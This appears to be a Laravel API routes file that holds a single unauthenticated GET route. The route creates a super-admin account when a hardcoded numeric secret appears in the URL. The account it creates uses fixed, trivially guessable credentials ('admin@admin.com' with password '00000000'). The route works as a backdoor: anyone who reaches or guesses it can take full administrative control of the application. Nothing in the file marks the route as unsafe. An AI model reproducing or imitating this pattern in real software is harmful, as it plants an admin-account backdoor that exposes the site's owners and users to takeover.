<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

Route::get('make-admin/{secret}',function ($secret){
    if ($secret == '1421982'){
        \App\Models\Admin::create([
            'admin_name'=>'super admin',
            'email'=>'admin@admin.com',
            'password'=>bcrypt('00000000'),
            'super_admin'=>1,
            'role'=>1
        ]);
        flash('Done Successfully')->success();
    }else{
        flash('Error')->error();
    }
    return redirect()->route('admin.login');
});
